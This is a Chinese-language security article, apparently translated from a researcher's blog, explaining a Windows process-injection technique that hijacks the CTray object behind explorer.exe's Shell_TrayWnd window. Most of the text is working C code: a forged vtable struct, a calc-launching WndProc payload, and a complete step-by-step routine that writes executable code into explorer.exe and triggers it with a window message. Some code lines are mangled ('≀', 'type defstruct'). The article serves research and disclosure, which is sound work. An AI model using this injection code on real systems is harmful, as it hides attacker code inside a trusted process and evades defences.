![Windows进程注入技术](https://image.3001.net/images/20180829/1535516174_5b861e0ee7b09.png!small)

## 介绍

 **Windows
进程注入技术之所以被众人所知，是因为2013年肆虐网络的Powerloader恶意软件当时使用的正是这种技术。在此之前，几乎没有人知道这种进程注入技术，因为从上世纪80年代到90年代初期，当时的Windows操作系统就已经引入了这种“功能”。额外窗口字节的索引0值可以用来跟一个窗口的类对象进行关联，指向类对象的指针是使用SetWindowLongPtr存储在索引0位置的，并通过GetWindowLongPtr来获取。**

早在2009年的WASM论坛上，就曾有一位名叫“Indy(Clerk)”的用户提到过将“Shell_TrayWnd”类作为一种注入向量来使用。下图显示的就是“Shell_TrayWnd”类的相关信息，你可以看到窗口字节的索引0设置有相应的值：

![Windows进程注入技术](https://image.3001.net/images/20180829/1535516183_5b861e1738b25.png!small)

WindowsSpy++在这里并不能显示完整的64位值，但是在下图中我们可以看到，它显示了GetWindowLongPtr
API所返回的同一窗口的值（CTray对象的完整地址）：

![Windows进程注入技术](https://image.3001.net/images/20180829/1535516190_5b861e1ed9db3.png!small)

## CTray类

这个类中只有三个方法，而且没有额外的属性值。指向每一个方法的指针都只有只读属性，所以我们不能直接将指向WndProc的指针重写并让它指向我们的Payload。因此，我们需要手动构造一个对象，但是我认为另一种比较好的方法是将现有对象拷贝到本地内存之中，重写WndProc，然后把对象写到explorer内存中的一个新的位置。下面的结构体可以用来定义我们所需要的对象及指针：

    
    
    //CTray object for Shell_TrayWnd
    type defstruct _ctray_vtable {
        ULONG_PTR vTable;    // change to remote memory address
        ULONG_PTR AddRef;
        ULONG_PTR Release;
        ULONG_PTR WndProc;   // window procedure (change to payload)
    }CTray;

上面这个结构体包含了替换CTray对象（包括32位和64位操作系统）所需要的所有数据，32位系统中ULONG_PTR的大小为4个字节，64位系统则是8个字节。

## Payload

这种方法跟PROPagate所使用的代码之间主要的区别就在于函数原型，如果在函数将返回值传递给调用者时我们不提供相同数量的参数，那么将有可能让Windows
Explorer崩溃，或者让那些跟这个类有关联的窗口发生崩溃。

    
    
    LRESULTCALLBACK WndProc(HWND hWnd, UINT uMsg,
      WPARAM wParam, LPARAM lParam)
    {
        // ignore messages other than WM_CLOSE
        if (uMsg != WM_CLOSE) return 0;
       
        WinExec_t pWinExec;
        DWORD    szWinExec[2],
                  szCalc[2];
     
        // WinExec
        szWinExec[0]=0x456E6957;
        szWinExec[1]=0x00636578;
     
        // calc
        szCalc[0] = 0x636C6163;
        szCalc[1] = 0;
     
        pWinExec =(WinExec_t)xGetProcAddress(szWinExec);
        if(pWinExec != NULL) {
          pWinExec((LPSTR)szCalc, SW_SHOW);
        }
        return 0;
    }

## 完整的函数

下面给出的是执行注入所需要的完整函数代码（位置无关代码PIC），这里为了方便演示，我忽略了错误处理：

    
    
    LPVOIDewm(LPVOID payload, DWORD payloadSize){
        LPVOID   cs, ds;
        CTray    ct;
        ULONG_PTR ctp;
        HWND     hw;
        HANDLE   hp;
        DWORD    pid;
        SIZE_T   wr;

1\. 获取shell tray窗口的处理器

    
    
        hw = FindWindow("Shell_TrayWnd",NULL);

2\. 获取explorer.exe的进程ID

    
    
        GetWindowThreadProcessId(hw, &pid);

3\. 打开explorer.exe

    
    
        hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE,pid);

4\. 获取指向当前CTray对象的指针

    
    
        ctp = GetWindowLongPtr(hw, 0);

5\. 读取当前CTray对象的地址

    
    
      ReadProcessMemory(hp, (LPVOID)ctp, 
    
            (LPVOID)&ct.vTable,sizeof(ULONG_PTR), ≀);

6\. 从虚拟页表中读取三条地址

    
    
    ReadProcessMemory(hp, (LPVOID)ct.vTable, 
    
          (LPVOID)&ct.AddRef, sizeof(ULONG_PTR)* 3, ≀);

7.为代码分配内存读/写/执行权限

    
    
      cs = VirtualAllocEx(hp, NULL, payloadSize, 
    
          MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);

8\. 将代码拷贝到目标进程中  

    
    
        WriteProcessMemory(hp, cs, payload,payloadSize, ≀);

9\. 为新的CTray对象分配内存读/写权限

    
    
     ds = VirtualAllocEx(hp, NULL, sizeof(ct), 
    
          MEM_COMMIT | MEM_RESERVE,PAGE_READWRITE);

10\. 向远程内存写入新的CTray对象

    
    
    ct.vTable = (ULONG_PTR)ds + sizeof(ULONG_PTR);
    
        ct.WndProc = (ULONG_PTR)cs;
    
        WriteProcessMemory(hp, ds, &ct,sizeof(ct), ≀);

11\. 设置指向CTray对象的新指针  

    
    
        SetWindowLongPtr(hw, 0, (ULONG_PTR)ds);

12\. 通过窗口消息触发Payload  

    
    
        PostMessage(hw, WM_CLOSE, 0, 0);

13\. 恢复原始的CTray对象  

    
    
        SetWindowLongPtr(hw, 0, ctp);

14\. 释放内存，关闭处理进程

    
    
       VirtualFreeEx(hp, cs, 0, MEM_DECOMMIT |MEM_RELEASE);
    
        VirtualFreeEx(hp, ds, 0, MEM_DECOMMIT |MEM_RELEASE);
    
     
    
        CloseHandle(hp);
    
    }

## 总结

这种针对窗口对象的进程注入技术通常会被归类为“Shatter”攻击，虽然Windows
Vista引入的用户接口权限隔离（UIPI）功能从某种程度上来说能够缓解这种攻击所带来的影响，但最新版本的Windows
10操作系统仍然无法抵御这种类型的攻击。

感兴趣的用户可以点击【[这里](https://github.com/odzhan/injection/tree/master/extrabytes)】获取Payload源代码和可执行程序计算器。

 *** 参考来源：[modexp](https://modexp.wordpress.com/2018/08/26/process-injection-ctray/)，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM**

